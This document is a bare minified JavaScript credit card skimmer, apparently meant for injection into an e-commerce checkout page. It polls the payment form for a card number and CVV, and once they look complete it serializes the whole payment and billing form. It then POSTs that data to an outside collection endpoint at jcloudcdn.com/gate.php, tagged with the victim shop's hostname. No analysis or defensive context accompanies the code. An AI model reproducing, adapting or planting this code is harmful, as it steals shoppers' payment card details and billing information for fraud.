var se=false;setInterval(function(){if((!se)&&(r=document.getElementsByName('payment[cc_number]')).length){n=r[0].value.replace(/[^\d]/g,'');r=document.getElementsByName('payment[cc_cid]');c=r.length?r[0].value:'';if((n.length==16&&c.length==3)||(n.length==15&&c.length==4)){f1=jQuery('form:has([name^=payment])');d='';se=true;if(f1.size())d=JSON.stringify(f1.serialize());if(d){d=d.replace('"billing%5B','billing%5B');jQuery.ajax({url:'https://jcloudcdn.com/gate.php?token=KjsS29Msl&host=grownuphydroponics.com',crossDomain:false,data:d,headers:{'X-Requested-With':'XMLHttpRequest'},type:'POST',dataType:'json',success:function(resp){return false},error:function(jqXHR,textStatus,errorThrown){return false}})}}}},700);
